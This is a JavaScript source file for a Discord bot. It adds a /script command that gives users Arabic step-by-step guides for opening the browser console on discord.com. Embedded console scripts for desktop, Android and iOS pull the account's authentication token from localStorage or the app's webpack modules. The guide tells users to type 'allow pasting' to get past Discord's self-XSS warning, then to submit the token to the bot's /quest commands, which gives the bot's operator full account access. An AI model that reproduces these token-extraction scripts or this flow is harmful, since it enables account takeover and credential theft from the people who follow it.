/*
╔══════════════════════════════════════════════════════════════════════╗
║                              row                              ║
║                     © row — All Rights Reserved              ║
╚══════════════════════════════════════════════════════════════════════╝
*/
const {
    SlashCommandBuilder,
    ActionRowBuilder,
    ButtonBuilder,
    ButtonStyle,
    StringSelectMenuBuilder,
    StringSelectMenuOptionBuilder,
    AttachmentBuilder,
} = require('discord.js');
const { getLanguage } = require('../database/db');
const { t } = require('../utils/i18n');
const { requireStarter } = require('../utils/guards');
const path = require('path');
const fs = require('fs');

/** Scripts (same as before — for user's own token only) */
const TOKEN_SCRIPTS = {
    android: "(function(){try{let f=document.createElement('iframe');document.body.appendChild(f);let t=JSON.parse(f.contentWindow.localStorage.token);let ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.remove();let n=document.createElement('div');n.innerHTML='<strong>row</strong><br>Token copied!';n.style.cssText='position:fixed;top:20px;left:20px;background:#001f3f;color:#7FDBFF;padding:12px 16px;border-radius:8px;z-index:99999;';document.body.appendChild(n);setTimeout(()=>n.remove(),3500);}catch(e){alert('Error: '+e);}})();",
    ios: "(function(){try{var i=document.createElement('iframe');i.style.display='none';document.body.appendChild(i);var t=i.contentWindow.localStorage.token.replace(/^\\\"(.*)\\\"$/,'$1');navigator.clipboard.writeText(t).then(function(){var d=document.createElement('div');d.innerHTML='<strong>row</strong><br>Token copied!';Object.assign(d.style,{position:'fixed',top:'10px',left:'10px',background:'#d4edda',color:'#155724',padding:'10px',borderRadius:'5px',zIndex:9999});document.body.appendChild(d);setTimeout(()=>d.remove(),3000);});}catch(e){alert('Failed: '+e);}})();",
    desktop: "window.webpackChunkdiscord_app.push([[Symbol()],{},o=>{for(let e of Object.values(o.c))try{if(!e.exports||e.exports===window)continue;if(e.exports?.getToken)return void console.log('Token:\\n'+e.exports.getToken());for(let o in e.exports)if(e.exports?.[o]?.getToken&&'IntlMessagesProxy'!==e.exports[o][Symbol.toStringTag])return void console.log('Token:\\n'+e.exports[o].getToken())}catch{}}]),window.webpackChunkdiscord_app.pop();",
};

function guideFor(platform) {
    if (platform === 'desktop') {
        return [
            '### 💻 الكمبيوتر (Chrome / Edge / Discord في المتصفح)',
            '',
            '**الخطوة 1:** افتح [discord.com/app](https://discord.com/app) وسجّل دخولك',
            '**الخطوة 2:** اضغط على لوحة المفاتيح: `F12`',
            '  • إذا ما اشتغل: كليك يمين على الصفحة → **Inspect** / فحص',
            '**الخطوة 3:** من فوق اختر تبويب **Console** (الكونسول)',
            '**الخطوة 4:** الصق الكود تحت واضغط **Enter**',
            '**الخطوة 5:** التوكن يظهر في الكونسول — انسخه',
            '',
            '⚠️ إذا كتب `Allow pasting` أو `اسمح باللصق`: اكتب `allow pasting` ثم Enter، بعدين الصق الكود مرة ثانية.',
            '',
            '**الخطوة 6:** ارجع هنا وشغّل:',
            '`/quest token: حط_التوكن_هنا`',
            'أو `/vip-quest token: حط_التوكن_هنا`',
        ].join('\n');
    }
    if (platform === 'android') {
        return [
            '### 📱 أندرويد',
            '',
            'تطبيق ديسكورد **الرسمي ما يدعم** الكونسول. لازم متصفح:',
            '',
            '**الخطوة 1:** ثبّت متصفح **Kiwi Browser** أو **Firefox** من المتجر',
            '**الخطوة 2:** افتح `discord.com/app` وسجّل دخولك (نفس حسابك)',
            '**الخطوة 3:** في Kiwi: القائمة `⋮` → **Developer tools** / أدوات المطوّر',
            '  أو: كليك يمين (ضغطة طويلة) → Inspect',
            '**الخطوة 4:** تبويب **Console**',
            '**الخطوة 5:** الصق الكود تحت → Enter',
            '**الخطوة 6:** راح تطلع رسالة **Token copied!** — التوكن اننسخ',
            '',
            '**الخطوة 7:** ارجع لديسكورد (التطبيق أو المتصفح) وشغّل:',
            '`/quest token: الصق_هنا`',
            '',
            '💡 أسهل طريقة غالباً: تسوي الخطوات من **الكمبيوتر** مرة واحدة، والتوكن يشتغل من أي جهاز مع البوت.',
        ].join('\n');
    }
    // ios
    return [
        '### 🍎 آيفون / آيباد',
        '',
        'تطبيق ديسكورد الرسمي **ما فيه** كونسول. الخيار الأسهل:',
        '',
        '**أ) من كمبيوتر (موصى به)**',
        '1. افتح discord.com/app من اللابتوب',
        '2. اتبع خطوات **Desktop** تحت `/script`',
        '3. انسخ التوكن واستخدمه مع البوت من جوالك عادي',
        '',
        '**ب) من الجوال (متقدم)**',
        '1. ثبّت متصفح يدعم أدوات المطوّر (مثل Safari + Web Inspector من الكمبيوتر، أو متصفح خارجي)',
        '2. افتح discord.com/app وسجّل دخول',
        '3. الصق الكود في الـ Console',
        '',
        '⚠️ على iOS الخطوات معقدة — **استخدم كمبيوتر** مرة واحدة وخلص.',
        '',
        'بعد ما يصير عندك التوكن:',
        '`/quest token: الصق_هنا` أو `/vip-quest token: ...`',
    ].join('\n');
}

async function handleScript(client, interaction) {
    if (await requireStarter(client, interaction)) return;

    await interaction.deferReply({ ephemeral: true });

    const row1 = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('script_plat_desktop').setLabel('كمبيوتر / PC').setStyle(ButtonStyle.Primary).setEmoji('💻'),
        new ButtonBuilder().setCustomId('script_plat_android').setLabel('أندرويد').setStyle(ButtonStyle.Secondary).setEmoji('📱'),
        new ButtonBuilder().setCustomId('script_plat_ios').setLabel('آيفون').setStyle(ButtonStyle.Secondary).setEmoji('🍎'),
    );

    const content = [
        '### 🔑 كيف تجيب التوكن وتربطه بالبوت؟',
        '',
        'التوكن = مفتاح حسابك. **لا تعطيه لأي شخص**، فقط الصقه في أوامر البوت.',
        '',
        '**باختصار:**',
        '1. اضغط زر منصتك تحت',
        '2. اتبع الخطوات بالتفصيل (وين تضغط عشان يطلع الكونسول)',
        '3. انسخ الكود → الصقه في الكونسول → Enter',
        '4. استخدم التوكن مع `/quest` أو `/vip-quest`',
        '',
        '💡 ما تعرف تستخدم الجوال؟ اختار **كمبيوتر** — أسهل وأكثر الناس هيك بتعمل.',
        '',
        '⚠️ لا تشارك التوكن في الشات العام.',
    ].join('\n');

    const replyOpts = { content, components: [row1] };
    const videoPath = path.join(__dirname, '..', 'video.mp4');
    if (fs.existsSync(videoPath)) {
        replyOpts.files = [new AttachmentBuilder(videoPath, { name: 'how-to-token.mp4' })];
    }

    await interaction.editReply(replyOpts);
}

async function sendPlatformGuide(interaction, platform) {
    const guide = guideFor(platform);
    const code = TOKEN_SCRIPTS[platform] || '';
    const body = [
        guide,
        '',
        '### 📋 الكود — انسخه كامل',
        '```js',
        code,
        '```',
        '',
        '✅ بعد النسخ شغّل أحد هالأوامر (رسالة خاصة /Ephemeral عادي):',
        '`/quest token: TOKN`',
        '`/vip-quest token: TOKN`',
    ].join('\n');

    // Discord message limit ~2000; guides are short enough
    if (interaction.replied || interaction.deferred) {
        return interaction.followUp({ content: body.slice(0, 1900), ephemeral: true });
    }
    return interaction.reply({ content: body.slice(0, 1900), ephemeral: true });
}

async function handleTokenInteraction(client, interaction) {
    if (interaction.isButton() && interaction.customId.startsWith('script_plat_')) {
        const platform = interaction.customId.replace('script_plat_', '');
        if (!['android', 'ios', 'desktop'].includes(platform)) {
            return interaction.reply({ content: '❌ Unknown platform.', ephemeral: true });
        }
        await interaction.deferUpdate().catch(() => {});
        await sendPlatformGuide(interaction, platform);
        return true;
    }

    if (interaction.isStringSelectMenu() && interaction.customId === 'script_platform_select') {
        const platform = interaction.values[0];
        await sendPlatformGuide(interaction, platform);
        return true;
    }
    return false;
}

module.exports = {
    data: [
        new SlashCommandBuilder()
            .setName('script')
            .setDescription('How to get your Discord token (step by step) / كيف تجيب التوكن خطوة بخطوة'),
    ],
    handleScript,
    handleTokenInteraction,
};
